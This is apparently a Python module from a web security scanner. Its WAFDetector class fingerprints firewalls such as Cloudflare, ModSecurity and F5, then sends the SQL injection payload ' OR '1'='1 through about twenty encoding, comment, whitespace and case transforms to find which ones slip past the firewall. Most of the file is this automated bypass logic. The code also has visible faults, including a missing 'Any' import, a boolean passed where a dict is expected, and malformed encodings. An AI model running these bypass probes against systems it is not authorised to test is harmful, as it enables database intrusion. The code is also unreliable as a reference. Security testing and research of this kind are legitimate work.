#!/usr/bin/env python3

import logging
from typing import Dict, List, Optional
from core.request_engine import RequestEngine

class WAFDetector:
    def __init__(self, request_engine: RequestEngine):
        """Initialize the WAF detector with a request engine."""
        self.request_engine = request_engine
        self.waf_signatures = {
            "mod_security": [
                "ModSecurity",
                "NOYB",
                "Mod_Security",
                "ModSecurity-nginx"
            ],
            "cloudflare": [
                "cf-ray",
                "__cfduid",
                "cloudflare-nginx",
                "cf-cache-status"
            ],
            "akamai": [
                "AkamaiGHost",
                "Akamai",
                "X-Akamai-Transformed"
            ],
            "incapsula": [
                "incap_ses",
                "visid_incap",
                "X-Iinfo"
            ],
            "f5": [
                "TS",
                "F5_HT_shrinked",
                "F5_HT_shrinked",
                "F5-TrafficShield"
            ],
            "barracuda": [
                "barra_counter_session",
                "BNI__BarraCounterSession",
                "BNI_persistence"
            ],
            "fortinet": [
                "FORTIWAFSID",
                "FORTIWAF",
                "FortiWeb"
            ]
        }
    
    def detect(self) -> bool:
        """Detect if target is protected by WAF."""
        try:
            # Send a request with a suspicious payload
            payload = "' OR '1'='1"
            response, _ = self.request_engine.send_request(payload)
            
            # Check response headers for WAF signatures
            if self._check_headers(response.headers):
                return True
            
            # Check response body for WAF signatures
            if self._check_body(response.text):
                return True
            
            # Check response status code
            if self._check_status_code(response.status_code):
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"WAF detection failed: {str(e)}")
            return False
    
    def _check_headers(self, headers: Dict[str, str]) -> bool:
        """Check response headers for WAF signatures."""
        for waf_type, signatures in self.waf_signatures.items():
            for signature in signatures:
                for header_name, header_value in headers.items():
                    if signature.lower() in header_value.lower():
                        logging.info(f"Detected {waf_type} WAF in headers")
                        return True
        return False
    
    def _check_body(self, body: str) -> bool:
        """Check response body for WAF signatures."""
        waf_indicators = [
            "blocked by",
            "security policy",
            "forbidden",
            "access denied",
            "security violation",
            "mod_security",
            "cloudflare",
            "incapsula",
            "akamai",
            "f5",
            "barracuda",
            "fortinet"
        ]
        
        for indicator in waf_indicators:
            if indicator.lower() in body.lower():
                logging.info(f"Detected WAF in response body: {indicator}")
                return True
        return False
    
    def _check_status_code(self, status_code: int) -> bool:
        """Check response status code for WAF indicators."""
        # Some WAFs return specific status codes
        waf_status_codes = [403, 406, 419, 429, 503]
        if status_code in waf_status_codes:
            logging.info(f"Detected WAF based on status code: {status_code}")
            return True
        return False
    
    def get_waf_type(self) -> Optional[str]:
        """Get the type of WAF if detected."""
        try:
            response, _ = self.request_engine.send_request()
            
            # Check headers for WAF type
            for waf_type, signatures in self.waf_signatures.items():
                for signature in signatures:
                    for header_name, header_value in response.headers.items():
                        if signature.lower() in header_value.lower():
                            return waf_type
            
            # Check body for WAF type
            for waf_type in self.waf_signatures.keys():
                if waf_type.lower() in response.text.lower():
                    return waf_type
            
            return None
            
        except Exception as e:
            logging.error(f"Failed to get WAF type: {str(e)}")
            return None

    def test_waf_bypass(self) -> List[Dict[str, Any]]:
        """Test various WAF bypass techniques."""
        bypass_results = []
        
        # Test different encoding techniques
        encoding_tests = [
            ("URL encoding", lambda x: x.replace("'", "%27").replace(" ", "%20")),
            ("Double URL encoding", lambda x: x.replace("'", "%2527").replace(" ", "%2520")),
            ("Hex encoding", lambda x: x.replace("'", "0x27").replace(" ", "0x20")),
            ("Unicode encoding", lambda x: x.replace("'", "u0027").replace(" ", "u0020")),
            ("HTML encoding", lambda x: x.replace("'", "&#39;").replace(" ", "&#32;"))
        ]
        
        # Test different comment styles
        comment_tests = [
            ("MySQL comments", lambda x: x + " --"),
            ("MySQL comments with space", lambda x: x + " -- "),
            ("MySQL comments with newline", lambda x: x + " --\n"),
            ("MySQL comments with hash", lambda x: x + " #"),
            ("MySQL comments with hash and space", lambda x: x + " # "),
            ("MySQL comments with hash and newline", lambda x: x + " #\n")
        ]
        
        # Test different string concatenation
        concat_tests = [
            ("MySQL concat", lambda x: x.replace("'", "CONCAT(CHAR(39))")),
            ("PostgreSQL concat", lambda x: x.replace("'", "CHR(39)")),
            ("MSSQL concat", lambda x: x.replace("'", "CHAR(39)"))
        ]
        
        # Test different whitespace techniques
        whitespace_tests = [
            ("Tab", lambda x: x.replace(" ", "\t")),
            ("Newline", lambda x: x.replace(" ", "\n")),
            ("Carriage return", lambda x: x.replace(" ", "\r")),
            ("Form feed", lambda x: x.replace(" ", "\f")),
            ("Vertical tab", lambda x: x.replace(" ", "\v")),
            ("Multiple spaces", lambda x: x.replace(" ", "  "))
        ]
        
        # Test different case variations
        case_tests = [
            ("Uppercase", lambda x: x.upper()),
            ("Lowercase", lambda x: x.lower()),
            ("Mixed case", lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)))
        ]
        
        # Combine all tests
        all_tests = encoding_tests + comment_tests + concat_tests + whitespace_tests + case_tests
        
        # Test each technique
        for test_name, transform_func in all_tests:
            try:
                # Get a basic SQL injection payload
                payload = "' OR '1'='1"
                transformed_payload = transform_func(payload)
                
                # Send request with transformed payload
                response, _ = self.request_engine.send_request(payload=transformed_payload)
                if not response:
                    continue
                    
                # Check if the request was successful (not blocked by WAF)
                if response.status_code == 200:
                    bypass_results.append({
                        "technique": test_name,
                        "payload": transformed_payload,
                        "status": "success",
                        "status_code": response.status_code
                    })
                    
            except Exception as e:
                logging.error(f"Error testing WAF bypass technique {test_name}: {str(e)}")
                continue
                
        return bypass_results
        
    def get_waf_info(self) -> Dict[str, Any]:
        """Get detailed WAF information."""
        waf_detection = self.detect()
        bypass_results = self.test_waf_bypass()
        
        return {
            "detection": waf_detection,
            "bypass_techniques": bypass_results,
            "recommendations": self._get_waf_recommendations(waf_detection)
        }
        
    def _get_waf_recommendations(self, waf_detection: Dict[str, Any]) -> List[str]:
        """Get recommendations based on WAF detection results."""
        recommendations = []
        
        if not waf_detection:
            recommendations.append("No WAF detected. Consider implementing a WAF for better security.")
            return recommendations
            
        waf_type = self.get_waf_type()
        
        if waf_type == "mod_security":
            recommendations.extend([
                "ModSecurity detected. Consider updating to the latest version.",
                "Review ModSecurity rules and adjust sensitivity if needed.",
                "Enable ModSecurity audit logging for better monitoring."
            ])
        elif waf_type == "cloudflare":
            recommendations.extend([
                "Cloudflare WAF detected. Consider enabling additional security features.",
                "Review Cloudflare security settings and rules.",
                "Enable Cloudflare logging for better monitoring."
            ])
        elif waf_type == "incapsula":
            recommendations.extend([
                "Incapsula WAF detected. Consider updating to the latest version.",
                "Review Incapsula security policies and rules.",
                "Enable Incapsula logging for better monitoring."
            ])
        elif waf_type == "f5":
            recommendations.extend([
                "F5 WAF detected. Consider updating to the latest version.",
                "Review F5 security policies and rules.",
                "Enable F5 logging for better monitoring."
            ])
        elif waf_type == "barracuda":
            recommendations.extend([
                "Barracuda WAF detected. Consider updating to the latest version.",
                "Review Barracuda security policies and rules.",
                "Enable Barracuda logging for better monitoring."
            ])
        elif waf_type == "fortinet":
            recommendations.extend([
                "Fortinet WAF detected. Consider updating to the latest version.",
                "Review Fortinet security policies and rules.",
                "Enable Fortinet logging for better monitoring."
            ])
        else:
            recommendations.append(f"Consider reviewing {waf_type} WAF configuration and rules.")
            
        return recommendations 
